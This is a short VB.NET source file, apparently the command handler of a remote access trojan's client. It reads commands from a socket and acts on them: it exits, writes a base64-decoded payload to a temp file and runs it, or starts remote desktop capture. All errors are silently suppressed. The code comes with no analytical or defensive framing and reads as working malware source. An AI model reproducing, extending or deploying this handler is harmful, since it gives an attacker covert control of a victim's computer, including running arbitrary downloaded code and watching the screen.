Imports System.IO

Public Class Messages
    Private Shared SPL = ClientSocket.SPL
    Private Shared EOF = ClientSocket.EOF

    Public Shared Sub Read(ByVal b As Byte())
        Try
            Dim A As String() = Split(BS(b).Replace(EOF, Nothing), SPL)
            Select Case A(0)

                Case "CLOSE"
                    Environment.Exit(0)

                Case "DW"
                    Dim NewFile = Path.GetTempFileName + A(1)
                    File.WriteAllBytes(NewFile, Convert.FromBase64String(A(2)))
                    Threading.Thread.Sleep(500)
                    Diagnostics.Process.Start(NewFile)

                Case "RD-"
                    ClientSocket.Send("RD-")

                Case "RD+"
                    RemoteDesktop.Capture(A(1), A(2))

            End Select
        Catch ex As Exception
        End Try
    End Sub

End Class
